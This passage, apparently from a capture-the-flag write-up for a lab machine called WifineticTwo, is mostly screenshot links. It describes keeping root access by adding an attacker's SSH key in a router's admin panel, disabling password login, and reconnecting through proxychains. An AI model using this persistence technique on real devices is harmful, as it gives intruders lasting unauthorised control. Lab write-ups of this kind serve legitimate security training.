![wifinetictwo untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e8ac6230-62be-4893-9235-15088c147b98)

Add your public key in `system -> administration -> SSH keys`

![wifinetictwo untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/bdb671b0-37f4-411c-a1a1-2fc592a81aec)

Finally, in the "SSH Access" tab, uncheck the "login with password" configurations.

![wifinetictwo untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0753d945-e62e-4e9d-b29a-0e89656a7c24)

Now you can login from Kali anytime without knowing the root password. Open an SSH session without password prompt using `proxychains` and your private key.

![wifinetictwo untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6a148803-e776-4103-938a-cf32f39cc48a)

You are root again.
